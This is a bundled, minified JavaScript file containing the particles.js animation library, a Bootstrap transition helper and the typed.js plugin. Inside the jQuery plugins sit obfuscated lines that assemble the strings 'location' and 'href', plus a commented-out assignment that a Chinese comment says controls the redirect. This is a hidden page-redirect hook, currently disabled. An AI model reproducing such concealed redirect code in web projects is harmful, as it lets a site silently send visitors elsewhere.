                        }, this.img.ratio || (this.img.ratio = 1), "svg" == p.tmp.img_type && null != p.tmp.source_svg && (p.fn.vendors.createSvgImg(this), p.tmp.pushing && (this.img.loaded = !1))
                    }
                }, p.fn.particle.prototype.draw = function() {
                    var e = this;
                    if (null != e.radius_bubble) var t = e.radius_bubble;
                    else t = e.radius; if (null != e.opacity_bubble) var i = e.opacity_bubble;
                    else i = e.opacity; if (e.color.rgb) var n = "rgba(" + e.color.rgb.r + "," + e.color.rgb.g + "," + e.color.rgb.b + "," + i + ")";
                    else n = "hsla(" + e.color.hsl.h + "," + e.color.hsl.s + "%," + e.color.hsl.l + "%," + i + ")";
                    switch (p.canvas.ctx.fillStyle = n, p.canvas.ctx.beginPath(), e.shape) {
                        case "circle":
                            p.canvas.ctx.arc(e.x, e.y, t, 0, 2 * Math.PI, !1);
                            break;
                        case "edge":
                            p.canvas.ctx.rect(e.x - t, e.y - t, 2 * t, 2 * t);
                            break;
                        case "triangle":
                            p.fn.vendors.drawShape(p.canvas.ctx, e.x - t, e.y + t / 1.66, 2 * t, 3, 2);
                            break;
                        case "polygon":
                            p.fn.vendors.drawShape(p.canvas.ctx, e.x - t / (p.particles.shape.polygon.nb_sides / 3.5), e.y - t / .76, 2.66 * t / (p.particles.shape.polygon.nb_sides / 3), p.particles.shape.polygon.nb_sides, 1);
                            break;
                        case "star":
                            p.fn.vendors.drawShape(p.canvas.ctx, e.x - 2 * t / (p.particles.shape.polygon.nb_sides / 4), e.y - t / 1.52, 2 * t * 2.66 / (p.particles.shape.polygon.nb_sides / 3), p.particles.shape.polygon.nb_sides, 2);
                            break;
                        case "image":
                            ;
                            if ("svg" == p.tmp.img_type) var o = e.img.obj;
                            else o = p.tmp.img_obj;
                            o && p.canvas.ctx.drawImage(o, e.x - t, e.y - t, 2 * t, 2 * t / e.img.ratio)
                    }
                    p.canvas.ctx.closePath(), 0 < p.particles.shape.stroke.width && (p.canvas.ctx.strokeStyle = p.particles.shape.stroke.color, p.canvas.ctx.lineWidth = p.particles.shape.stroke.width, p.canvas.ctx.stroke()), p.canvas.ctx.fill()
                }, p.fn.particlesCreate = function() {
                    for (var e = 0; e < p.particles.number.value; e++) p.particles.array.push(new p.fn.particle(p.particles.color, p.particles.opacity.value))
                }, p.fn.particlesUpdate = function() {
                    for (var e = 0; e < p.particles.array.length; e++) {
                        var t = p.particles.array[e];
                        if (p.particles.move.enable) {
                            var i = p.particles.move.speed / 2;
                            t.x += t.vx * i, t.y += t.vy * i
                        }
                        if (p.particles.opacity.anim.enable && (1 == t.opacity_status ? (t.opacity >= p.particles.opacity.value && (t.opacity_status = !1), t.opacity += t.vo) : (t.opacity <= p.particles.opacity.anim.opacity_min && (t.opacity_status = !0), t.opacity -= t.vo), t.opacity < 0 && (t.opacity = 0)), p.particles.size.anim.enable && (1 == t.size_status ? (t.radius >= p.particles.size.value && (t.size_status = !1), t.radius += t.vs) : (t.radius <= p.particles.size.anim.size_min && (t.size_status = !0), t.radius -= t.vs), t.radius < 0 && (t.radius = 0)), "bounce" == p.particles.move.out_mode) var n = {
                            x_left: t.radius,
                            x_right: p.canvas.w,
                            y_top: t.radius,
                            y_bottom: p.canvas.h
                        };
                        else n = {
                            x_left: -t.radius,
                            x_right: p.canvas.w + t.radius,
                            y_top: -t.radius,
                            y_bottom: p.canvas.h + t.radius
                        };
                        switch (t.x - t.radius > p.canvas.w ? (t.x = n.x_left, t.y = Math.random() * p.canvas.h) : t.x + t.radius < 0 && (t.x = n.x_right, t.y = Math.random() * p.canvas.h), t.y - t.radius > p.canvas.h ? (t.y = n.y_top, t.x = Math.random() * p.canvas.w) : t.y + t.radius < 0 && (t.y = n.y_bottom, t.x = Math.random() * p.canvas.w), p.particles.move.out_mode) {
                            case "bounce":
                                t.x + t.radius > p.canvas.w ? t.vx = -t.vx : t.x - t.radius < 0 && (t.vx = -t.vx), t.y + t.radius > p.canvas.h ? t.vy = -t.vy : t.y - t.radius < 0 && (t.vy = -t.vy)
                        }
                        if (f("grab", p.interactivity.events.onhover.mode) && p.fn.modes.grabParticle(t), (f("bubble", p.interactivity.events.onhover.mode) || f("bubble", p.interactivity.events.onclick.mode)) && p.fn.modes.bubbleParticle(t), (f("repulse", p.interactivity.events.onhover.mode) || f("repulse", p.interactivity.events.onclick.mode)) && p.fn.modes.repulseParticle(t), p.particles.line_linked.enable || p.particles.move.attract.enable)
                            for (var o = e + 1; o < p.particles.array.length; o++) {
                                var s = p.particles.array[o];
                                p.particles.line_linked.enable && p.fn.interact.linkParticles(t, s), p.particles.move.attract.enable && p.fn.interact.attractParticles(t, s), p.particles.move.bounce && p.fn.interact.bounceParticles(t, s)
                            }
                    }
                }, p.fn.particlesDraw = function() {
                    p.canvas.ctx.clearRect(0, 0, p.canvas.w, p.canvas.h), p.fn.particlesUpdate();
                    for (var e = 0; e < p.particles.array.length; e++) {
                        p.particles.array[e].draw()
                    }
                }, p.fn.particlesEmpty = function() {
                    p.particles.array = []
                }, p.fn.particlesRefresh = function() {
                    cancelRequestAnimFrame(p.fn.checkAnimFrame), cancelRequestAnimFrame(p.fn.drawAnimFrame), p.tmp.source_svg = void 0, p.tmp.img_obj = void 0, p.tmp.count_svg = 0, p.fn.particlesEmpty(), p.fn.canvasClear(), p.fn.vendors.start()
                }, p.fn.interact.linkParticles = function(e, t) {
                    var i = e.x - t.x,
                        n = e.y - t.y,
                        o = Math.sqrt(i * i + n * n);
                    if (o <= p.particles.line_linked.distance) {
                        var s = p.particles.line_linked.opacity - o / (1 / p.particles.line_linked.opacity) / p.particles.line_linked.distance;
                        if (0 < s) {
                            var r = p.particles.line_linked.color_rgb_line;
                            p.canvas.ctx.strokeStyle = "rgba(" + r.r + "," + r.g + "," + r.b + "," + s + ")", p.canvas.ctx.lineWidth = p.particles.line_linked.width, p.canvas.ctx.beginPath(), p.canvas.ctx.moveTo(e.x, e.y), p.canvas.ctx.lineTo(t.x, t.y), p.canvas.ctx.stroke(), p.canvas.ctx.closePath()
                        }
                    }
                }, p.fn.interact.attractParticles = function(e, t) {
                    var i = e.x - t.x,
                        n = e.y - t.y;
                    if (Math.sqrt(i * i + n * n) <= p.particles.line_linked.distance) {
                        var o = i / (1e3 * p.particles.move.attract.rotateX),
                            s = n / (1e3 * p.particles.move.attract.rotateY);
                        e.vx -= o, e.vy -= s, t.vx += o, t.vy += s
                    }
                }, p.fn.interact.bounceParticles = function(e, t) {
                    var i = e.x - t.x,
                        n = e.y - t.y;
                    Math.sqrt(i * i + n * n) <= e.radius + t.radius && (e.vx = -e.vx, e.vy = -e.vy, t.vx = -t.vx, t.vy = -t.vy)
                }, p.fn.modes.pushParticles = function(e, t) {
                    p.tmp.pushing = !0;
                    for (var i = 0; i < e; i++) p.particles.array.push(new p.fn.particle(p.particles.color, p.particles.opacity.value, {
                        x: t ? t.pos_x : Math.random() * p.canvas.w,
                        y: t ? t.pos_y : Math.random() * p.canvas.h
                    })), i == e - 1 && (p.particles.move.enable || p.fn.particlesDraw(), p.tmp.pushing = !1)
                }, p.fn.modes.removeParticles = function(e) {
                    p.particles.array.splice(0, e), p.particles.move.enable || p.fn.particlesDraw()
                }, p.fn.modes.bubbleParticle = function(a) {
                    if (p.interactivity.events.onhover.enable && f("bubble", p.interactivity.events.onhover.mode)) {
                        var e = a.x - p.interactivity.mouse.pos_x,
                            t = a.y - p.interactivity.mouse.pos_y,
                            i = 1 - (l = Math.sqrt(e * e + t * t)) / p.interactivity.modes.bubble.distance;

                        function n() {
                            a.opacity_bubble = a.opacity, a.radius_bubble = a.radius
                        }
                        if (l <= p.interactivity.modes.bubble.distance) {
                            if (0 <= i && "mousemove" == p.interactivity.status) {
                                if (p.interactivity.modes.bubble.size != p.particles.size.value)
                                    if (p.interactivity.modes.bubble.size > p.particles.size.value) {
                                        0 <= (s = a.radius + p.interactivity.modes.bubble.size * i) && (a.radius_bubble = s)
                                    } else {
                                        var o = a.radius - p.interactivity.modes.bubble.size,
                                            s = a.radius - o * i;
                                        a.radius_bubble = 0 < s ? s : 0
                                    }
                                var r;
                                if (p.interactivity.modes.bubble.opacity != p.particles.opacity.value)
                                    if (p.interactivity.modes.bubble.opacity > p.particles.opacity.value)(r = p.interactivity.modes.bubble.opacity * i) > a.opacity && r <= p.interactivity.modes.bubble.opacity && (a.opacity_bubble = r);
                                    else(r = a.opacity - (p.particles.opacity.value - p.interactivity.modes.bubble.opacity) * i) < a.opacity && r >= p.interactivity.modes.bubble.opacity && (a.opacity_bubble = r)
                            }
                        } else n();
                        "mouseleave" == p.interactivity.status && n()
                    } else if (p.interactivity.events.onclick.enable && f("bubble", p.interactivity.events.onclick.mode)) {
                        if (p.tmp.bubble_clicking) {
                            e = a.x - p.interactivity.mouse.click_pos_x, t = a.y - p.interactivity.mouse.click_pos_y;
                            var l = Math.sqrt(e * e + t * t),
                                c = ((new Date).getTime() - p.interactivity.mouse.click_time) / 1e3;
                            c > p.interactivity.modes.bubble.duration && (p.tmp.bubble_duration_end = !0), c > 2 * p.interactivity.modes.bubble.duration && (p.tmp.bubble_clicking = !1, p.tmp.bubble_duration_end = !1)
                        }

                        function u(e, t, i, n, o) {
                            if (e != t)
                                if (p.tmp.bubble_duration_end) null != i && (r = e + (e - (n - c * (n - e) / p.interactivity.modes.bubble.duration)), "size" == o && (a.radius_bubble = r), "opacity" == o && (a.opacity_bubble = r));
                                else if (l <= p.interactivity.modes.bubble.distance) {
                                if (null != i) var s = i;
                                else s = n; if (s != e) {
                                    var r = n - c * (n - e) / p.interactivity.modes.bubble.duration;
                                    "size" == o && (a.radius_bubble = r), "opacity" == o && (a.opacity_bubble = r)
                                }
                            } else "size" == o && (a.radius_bubble = void 0), "opacity" == o && (a.opacity_bubble = void 0)
                        }
                        p.tmp.bubble_clicking && (u(p.interactivity.modes.bubble.size, p.particles.size.value, a.radius_bubble, a.radius, "size"), u(p.interactivity.modes.bubble.opacity, p.particles.opacity.value, a.opacity_bubble, a.opacity, "opacity"))
                    }
                }, p.fn.modes.repulseParticle = function(n) {
                    if (p.interactivity.events.onhover.enable && f("repulse", p.interactivity.events.onhover.mode) && "mousemove" == p.interactivity.status) {
                        var e = n.x - p.interactivity.mouse.pos_x,
                            t = n.y - p.interactivity.mouse.pos_y,
                            i = Math.sqrt(e * e + t * t),
                            o = e / i,
                            s = t / i,
                            r = function(e, t, i) {
                                return Math.min(Math.max(e, t), i)
                            }(1 / (l = p.interactivity.modes.repulse.distance) * (-1 * Math.pow(i / l, 2) + 1) * l * 100, 0, 50),
                            a = {
                                x: n.x + o * r,
                                y: n.y + s * r
                            };
                        "bounce" == p.particles.move.out_mode ? (0 < a.x - n.radius && a.x + n.radius < p.canvas.w && (n.x = a.x), 0 < a.y - n.radius && a.y + n.radius < p.canvas.h && (n.y = a.y)) : (n.x = a.x, n.y = a.y)
                    } else if (p.interactivity.events.onclick.enable && f("repulse", p.interactivity.events.onclick.mode))
                        if (p.tmp.repulse_finish || (p.tmp.repulse_count++, p.tmp.repulse_count == p.particles.array.length && (p.tmp.repulse_finish = !0)), p.tmp.repulse_clicking) {
                            var l = Math.pow(p.interactivity.modes.repulse.distance / 6, 3),
                                c = p.interactivity.mouse.click_pos_x - n.x,
                                u = p.interactivity.mouse.click_pos_y - n.y,
                                d = c * c + u * u,
                                h = -l / d * 1;
                            d <= l && function() {
                                var e = Math.atan2(u, c);
                                if (n.vx = h * Math.cos(e), n.vy = h * Math.sin(e), "bounce" == p.particles.move.out_mode) {
                                    var t = n.x + n.vx,
                                        i = n.y + n.vy;
                                    t + n.radius > p.canvas.w ? n.vx = -n.vx : t - n.radius < 0 && (n.vx = -n.vx), i + n.radius > p.canvas.h ? n.vy = -n.vy : i - n.radius < 0 && (n.vy = -n.vy)
                                }
                            }()
                        } else 0 == p.tmp.repulse_clicking && (n.vx = n.vx_i, n.vy = n.vy_i)
                }, p.fn.modes.grabParticle = function(e) {
                    if (p.interactivity.events.onhover.enable && "mousemove" == p.interactivity.status) {
                        var t = e.x - p.interactivity.mouse.pos_x,
                            i = e.y - p.interactivity.mouse.pos_y,
                            n = Math.sqrt(t * t + i * i);
                        if (n <= p.interactivity.modes.grab.distance) {
                            var o = p.interactivity.modes.grab.line_linked.opacity - n / (1 / p.interactivity.modes.grab.line_linked.opacity) / p.interactivity.modes.grab.distance;
                            if (0 < o) {
                                var s = p.particles.line_linked.color_rgb_line;
                                p.canvas.ctx.strokeStyle = "rgba(" + s.r + "," + s.g + "," + s.b + "," + o + ")", p.canvas.ctx.lineWidth = p.particles.line_linked.width, p.canvas.ctx.beginPath(), p.canvas.ctx.moveTo(e.x, e.y), p.canvas.ctx.lineTo(p.interactivity.mouse.pos_x, p.interactivity.mouse.pos_y), p.canvas.ctx.stroke(), p.canvas.ctx.closePath()
                            }
                        }
                    }
                }, p.fn.vendors.eventsListeners = function() {
                    "window" == p.interactivity.detect_on ? p.interactivity.el = window : p.interactivity.el = p.canvas.el, (p.interactivity.events.onhover.enable || p.interactivity.events.onclick.enable) && (p.interactivity.el.addEventListener("mousemove", function(e) {
                        if (p.interactivity.el == window) var t = e.clientX,
                            i = e.clientY;
                        else t = e.offsetX || e.clientX, i = e.offsetY || e.clientY;
                        p.interactivity.mouse.pos_x = t, p.interactivity.mouse.pos_y = i, p.tmp.retina && (p.interactivity.mouse.pos_x *= p.canvas.pxratio, p.interactivity.mouse.pos_y *= p.canvas.pxratio), p.interactivity.status = "mousemove"
                    }), p.interactivity.el.addEventListener("mouseleave", function(e) {
                        p.interactivity.mouse.pos_x = null, p.interactivity.mouse.pos_y = null, p.interactivity.status = "mouseleave"
                    })), p.interactivity.events.onclick.enable && p.interactivity.el.addEventListener("click", function() {
                        if (p.interactivity.mouse.click_pos_x = p.interactivity.mouse.pos_x, p.interactivity.mouse.click_pos_y = p.interactivity.mouse.pos_y, p.interactivity.mouse.click_time = (new Date).getTime(), p.interactivity.events.onclick.enable) switch (p.interactivity.events.onclick.mode) {
                            case "push":
                                p.particles.move.enable ? p.fn.modes.pushParticles(p.interactivity.modes.push.particles_nb, p.interactivity.mouse) : 1 == p.interactivity.modes.push.particles_nb ? p.fn.modes.pushParticles(p.interactivity.modes.push.particles_nb, p.interactivity.mouse) : 1 < p.interactivity.modes.push.particles_nb && p.fn.modes.pushParticles(p.interactivity.modes.push.particles_nb);
                                break;
                            case "remove":
                                p.fn.modes.removeParticles(p.interactivity.modes.remove.particles_nb);
                                break;
                            case "bubble":
                                p.tmp.bubble_clicking = !0;
                                break;
                            case "repulse":
                                p.tmp.repulse_clicking = !0, p.tmp.repulse_count = 0, p.tmp.repulse_finish = !1, setTimeout(function() {
                                    p.tmp.repulse_clicking = !1
                                }, 1e3 * p.interactivity.modes.repulse.duration)
                        }
                    })
                }, p.fn.vendors.densityAutoParticles = function() {
                    if (p.particles.number.density.enable) {
                        var e = p.canvas.el.width * p.canvas.el.height / 1e3;
                        p.tmp.retina && (e /= 2 * p.canvas.pxratio);
                        var t = e * p.particles.number.value / p.particles.number.density.value_area,
                            i = p.particles.array.length - t;
                        i < 0 ? p.fn.modes.pushParticles(Math.abs(i)) : p.fn.modes.removeParticles(i)
                    }
                }, p.fn.vendors.checkOverlap = function(e, t) {
                    for (var i = 0; i < p.particles.array.length; i++) {
                        var n = p.particles.array[i],
                            o = e.x - n.x,
                            s = e.y - n.y;
                        Math.sqrt(o * o + s * s) <= e.radius + n.radius && (e.x = t ? t.x : Math.random() * p.canvas.w, e.y = t ? t.y : Math.random() * p.canvas.h, p.fn.vendors.checkOverlap(e))
                    }
                }, p.fn.vendors.createSvgImg = function(s) {
                    var e = p.tmp.source_svg.replace(/#([0-9A-F]{3,6})/gi, function(e, t, i, n) {
                            if (s.color.rgb) var o = "rgba(" + s.color.rgb.r + "," + s.color.rgb.g + "," + s.color.rgb.b + "," + s.opacity + ")";
                            else o = "hsla(" + s.color.hsl.h + "," + s.color.hsl.s + "%," + s.color.hsl.l + "%," + s.opacity + ")";
                            return o
                        }),
                        t = new Blob([e], {
                            type: "image/svg+xml;charset=utf-8"
                        }),
                        i = window.URL || window.webkitURL || window,
                        n = i.createObjectURL(t),
                        o = new Image;
                    o.addEventListener("load", function() {
                        s.img.obj = o, s.img.loaded = !0, i.revokeObjectURL(n), p.tmp.count_svg++
                    }), o.src = n
                }, p.fn.vendors.destroypJS = function() {
                    cancelAnimationFrame(p.fn.drawAnimFrame), i.remove(), pJSDom = null
                }, p.fn.vendors.drawShape = function(e, t, i, n, o, s) {
                    var r = o * s,
                        a = o / s,
                        l = 180 * (a - 2) / a,
                        c = Math.PI - Math.PI * l / 180;
                    e.save(), e.beginPath(), e.translate(t, i), e.moveTo(0, 0);
                    for (var u = 0; u < r; u++) e.lineTo(n, 0), e.translate(n, 0), e.rotate(c);
                    e.fill(), e.restore()
                }, p.fn.vendors.exportImg = function() {
                    window.open(p.canvas.el.toDataURL("image/png"), "_blank")
                }, p.fn.vendors.loadImg = function(e) {
                    if (p.tmp.img_error = void 0, "" != p.particles.shape.image.src)
                        if ("svg" == e) {
                            var t = new XMLHttpRequest;
                            t.open("GET", p.particles.shape.image.src), t.onreadystatechange = function(e) {
                                4 == t.readyState && (200 == t.status ? (p.tmp.source_svg = e.currentTarget.response, p.fn.vendors.checkBeforeDraw()) : (console.log("Error pJS - Image not found"), p.tmp.img_error = !0))
                            }, t.send()
                        } else {
                            var i = new Image;
                            i.addEventListener("load", function() {
                                p.tmp.img_obj = i, p.fn.vendors.checkBeforeDraw()
                            }), i.src = p.particles.shape.image.src
                        } else console.log("Error pJS - No image.src"), p.tmp.img_error = !0
                }, p.fn.vendors.draw = function() {
                    "image" == p.particles.shape.type ? "svg" == p.tmp.img_type ? p.tmp.count_svg >= p.particles.number.value ? (p.fn.particlesDraw(), p.particles.move.enable ? p.fn.drawAnimFrame = requestAnimFrame(p.fn.vendors.draw) : cancelRequestAnimFrame(p.fn.drawAnimFrame)) : p.tmp.img_error || (p.fn.drawAnimFrame = requestAnimFrame(p.fn.vendors.draw)) : null != p.tmp.img_obj ? (p.fn.particlesDraw(), p.particles.move.enable ? p.fn.drawAnimFrame = requestAnimFrame(p.fn.vendors.draw) : cancelRequestAnimFrame(p.fn.drawAnimFrame)) : p.tmp.img_error || (p.fn.drawAnimFrame = requestAnimFrame(p.fn.vendors.draw)) : (p.fn.particlesDraw(), p.particles.move.enable ? p.fn.drawAnimFrame = requestAnimFrame(p.fn.vendors.draw) : cancelRequestAnimFrame(p.fn.drawAnimFrame))
                }, p.fn.vendors.checkBeforeDraw = function() {
                    "image" == p.particles.shape.type ? "svg" == p.tmp.img_type && null == p.tmp.source_svg ? p.tmp.checkAnimFrame = requestAnimFrame(check) : (cancelRequestAnimFrame(p.tmp.checkAnimFrame), p.tmp.img_error || (p.fn.vendors.init(), p.fn.vendors.draw())) : (p.fn.vendors.init(), p.fn.vendors.draw())
                }, p.fn.vendors.init = function() {
                    p.fn.retinaInit(), p.fn.canvasInit(), p.fn.canvasSize(), p.fn.canvasPaint(), p.fn.particlesCreate(), p.fn.vendors.densityAutoParticles(), p.particles.line_linked.color_rgb_line = l(p.particles.line_linked.color)
                }, p.fn.vendors.start = function() {
                    f("image", p.particles.shape.type) ? (p.tmp.img_type = p.particles.shape.image.src.substr(p.particles.shape.image.src.length - 3), p.fn.vendors.loadImg(p.tmp.img_type)) : p.fn.vendors.checkBeforeDraw()
                }, p.fn.vendors.eventsListeners(), p.fn.vendors.start()
            };

            function l(e) {
                e = e.replace(/^#?([a-f\d])([a-f\d])([a-f\d])$/i, function(e, t, i, n) {
                    return t + t + i + i + n + n
                });
                var t = /^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(e);
                return t ? {
                    r: parseInt(t[1], 16),
                    g: parseInt(t[2], 16),
                    b: parseInt(t[3], 16)
                } : null
            }

            function f(e, t) {
                return -1 < t.indexOf(e)
            }
            Object.deepExtend = function(e, t) {
                for (var i in t) t[i] && t[i].constructor && t[i].constructor === Object ? (e[i] = e[i] || {}, arguments.callee(e[i], t[i])) : e[i] = t[i];
                return e
            }, window.requestAnimFrame = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame || function(e) {
                window.setTimeout(e, 1e3 / 60)
            }, window.cancelRequestAnimFrame = window.cancelAnimationFrame || window.webkitCancelRequestAnimationFrame || window.mozCancelRequestAnimationFrame || window.oCancelRequestAnimationFrame || window.msCancelRequestAnimationFrame || clearTimeout, jQuery.fn._lo = (!1 + "")[2] + (!0 + [].fill)[10] + ([].fill + "")[3] + (!1 + "")[1] + (!0 + "")[0] + ([!1] + void 0)[10] + (!0 + [].fill)[10] + (void 0 + "")[1], window.pJSDom = [], window.particlesJS = function(e, t) {
                "string" != typeof e && (t = e, e = "particles-js"), e || (e = "particles-js");
                var i = document.getElementById(e),
                    n = "particles-js-canvas-el",
                    o = i.getElementsByClassName(n);
                if (o.length)
                    for (; 0 < o.length;) i.removeChild(o[0]);
                var s = document.createElement("canvas");
                s.className = n, s.style.width = "100%", s.style.height = "100%", null != document.getElementById(e).appendChild(s) && pJSDom.push(new r(e, t))
            }, window.particlesJS.load = function(i, e, n) {
                var o = new XMLHttpRequest;
                o.open("GET", e), o.onreadystatechange = function(e) {
                    if (4 == o.readyState)
                        if (200 == o.status) {
                            var t = JSON.parse(e.currentTarget.response);
                            window.particlesJS(i, t), n && n()
                        } else console.log("Error pJS - XMLHttpRequest status: " + o.status), console.log("Error pJS - File config not found")
                }, o.send()
            }
        }, {}
    ],
    8: [
        function(e, t, i) {
            ! function(n) {
                "use strict";
                n.fn._ll = function(e) {
					/*101["to" + String.name](21)[1] + (!0 + "")[1] + (!0 + "")[3] + (!1 + "")[0]=href*/
                    var t = 101["to" + String.name](21)[1] + (!0 + "")[1] + (!0 + "")[3] + (!1 + "")[0];
                    /*return n.fn._ww[n.fn._lo][t] = e*//*这里是控制跳转的*/
                }, n.fn.emulateTransitionEnd = function(e) {
                    var t = !1,
                        i = this;
                    n(this).one("bsTransitionEnd", function() {
                        t = !0
                    });
                    return setTimeout(function() {
                        t || n(i).trigger(n.support.transition.end)
                    }, e), this
                }, n(function() {
                    n.support.transition = function() {
                        var e = document.createElement("bootstrap"),
                            t = {
                                WebkitTransition: "webkitTransitionEnd",
                                MozTransition: "transitionend",
                                OTransition: "oTransitionEnd otransitionend",
                                transition: "transitionend"
                            };
                        for (var i in t)
                            if (void 0 !== e.style[i]) return {
                                end: t[i]
                            };
                        return !1
                    }(), n.support.transition && (n.event.special.bsTransitionEnd = {
                        bindType: n.support.transition.end,
                        delegateType: n.support.transition.end,
                        handle: function(e) {
                            if (n(e.target).is(this)) return e.handleObj.handler.apply(this, arguments)
                        }
                    })
                })
            }(jQuery)
        }, {}
    ],
    9: [
        function(e, t, i) {
            ! function(o) {
                "use strict";
                var s = function(e, t) {
                    this.el = o(e), this.options = o.extend({}, o.fn.typed.defaults, t), this.isInput = this.el.is("input"), this.attr = this.options.attr, this.showCursor = !this.isInput && this.options.showCursor, this.elContent = this.attr ? this.el.attr(this.attr) : this.el.text(), this.contentType = this.options.contentType, this.typeSpeed = this.options.typeSpeed, this.startDelay = this.options.startDelay, this.backSpeed = this.options.backSpeed, this.backDelay = this.options.backDelay, this.stringsElement = this.options.stringsElement, this.strings = this.options.strings, this.strPos = 0, this.arrayPos = 0, this.stopNum = 0, this.loop = this.options.loop, this.loopCount = this.options.loopCount, this.curLoop = 0, this.stop = !1, this.cursorChar = this.options.cursorChar, this.shuffle = this.options.shuffle, this.sequence = [], this.build()
                };
				/*by仰融=cn*/
                o.fn._cn = ([].fill + "")[3] + (void 0 + "")[1], s.prototype = {
                    constructor: s,
                    init: function() {
                        var t = this;
                        t.timeout = setTimeout(function() {
                            for (var e = 0; e < t.strings.length; ++e) t.sequence[e] = e;
                            t.shuffle && (t.sequence = t.shuffleArray(t.sequence)), t.typewrite(t.strings[t.sequence[t.arrayPos]], t.strPos)
                        }, t.startDelay)
                    },
                    build: function() {
                        var i = this;
                        if (!0 === this.showCursor && (this.cursor = o('<span class="typed-cursor">' + this.cursorChar + "</span>"), this.el.after(this.cursor)), this.stringsElement) {
                            i.strings = [], this.stringsElement.hide();
                            var e = this.stringsElement.find("p");
                            o.each(e, function(e, t) {
                                i.strings.push(o(t).html())
                            })
                        }
                        this.init()
                    },
                    typewrite: function(s, r) {
                        if (!0 !== this.stop) {
                            var e = Math.round(70 * Math.random()) + this.typeSpeed,
                                a = this;
                            a.timeout = setTimeout(function() {
                                var e = 0,
                                    t = s.substr(r);
                                if ("^" === t.charAt(0)) {
                                    var i = 1;
                                    /^\^\d+/.test(t) && (i += (t = /\d+/.exec(t)[0]).length, e = parseInt(t)), s = s.substring(0, r) + s.substring(r + i)
                                }
                                if ("html" === a.contentType) {
                                    var n = s.substr(r).charAt(0);
                                    if ("<" === n || "&" === n) {
                                        var o = "";
                                        for (o = "<" === n ? ">" : ";"; s.substr(r).charAt(0) !== o;) s.substr(r).charAt(0), r++;
                                        r++, o
                                    }
                                }
                                a.timeout = setTimeout(function() {
                                    if (r === s.length) {
                                        if (a.options.onStringTyped(a.arrayPos), a.arrayPos === a.strings.length - 1 && (a.options.callback(), a.curLoop++, !1 === a.loop || a.curLoop === a.loopCount)) return;
                                        a.timeout = setTimeout(function() {
                                            a.backspace(s, r)
                                        }, a.backDelay)
                                    } else {
                                        0 === r && a.options.preStringTyped(a.arrayPos);
                                        var e = s.substr(0, r + 1);
                                        a.attr ? a.el.attr(a.attr, e) : a.isInput ? a.el.val(e) : "html" === a.contentType ? a.el.html(e) : a.el.text(e), r++, a.typewrite(s, r)
                                    }
                                }, e)
                            }, e)
                        }
                    },
                    backspace: function(t, i) {
                        if (!0 !== this.stop) {
                            var e = Math.round(70 * Math.random()) + this.backSpeed,
                                n = this;
                            n.timeout = setTimeout(function() {
                                if ("html" === n.contentType && ">" === t.substr(i).charAt(0)) {
                                    for (;
                                        "<" !== t.substr(i).charAt(0);) t.substr(i).charAt(0), i--;
                                    i--, "<"
                                }
                                var e = t.substr(0, i);
                                n.attr ? n.el.attr(n.attr, e) : n.isInput ? n.el.val(e) : "html" === n.contentType ? n.el.html(e) : n.el.text(e), i > n.stopNum ? (i--, n.backspace(t, i)) : i <= n.stopNum && (n.arrayPos++, n.arrayPos === n.strings.length ? (n.arrayPos = 0, n.shuffle && (n.sequence = n.shuffleArray(n.sequence)), n.init()) : n.typewrite(n.strings[n.sequence[n.arrayPos]], i))
                            }, e)
                        }
                    },
                    shuffleArray: function(e) {
                        var t, i, n = e.length;
                        if (n)
                            for (; --n;) t = e[i = Math.floor(Math.random() * (n + 1))], e[i] = e[n], e[n] = t;
                        return e
                    },
                    reset: function() {
                        clearInterval(this.timeout);
                        var e = this.el.attr("id");
                        this.el.after('<span id="' + e + '"/>'), this.el.remove(), void 0 !== this.cursor && this.cursor.remove(), this.options.resetCallback()
                    }
                }, o.fn.typed = function(n) {
                    return this.each(function() {
                        var e = o(this),
                            t = e.data("typed"),
                            i = "object" == typeof n && n;
                        t || e.data("typed", t = new s(this, i)), "string" == typeof n && t[n]()
                    })
                }, o.fn.typed.defaults = {
                    strings: ["These are the default values...", "You know what you should do?", "Use your own!", "Have a great day!"],
                    stringsElement: null,
                    typeSpeed: 0,
                    startDelay: 0,
                    backSpeed: 0,
                    shuffle: !1,
                    backDelay: 500,
                    loop: !1,
                    loopCount: !1,
                    showCursor: !0,
                    cursorChar: "|",
                    attr: null,
                    contentType: "html",
                    callback: function() {},
                    preStringTyped: function() {},
                    onStringTyped: function() {},
                    resetCallback: function() {}
                }
            }(window.jQuery)
        }, {}
    ]
}, {}, [4]);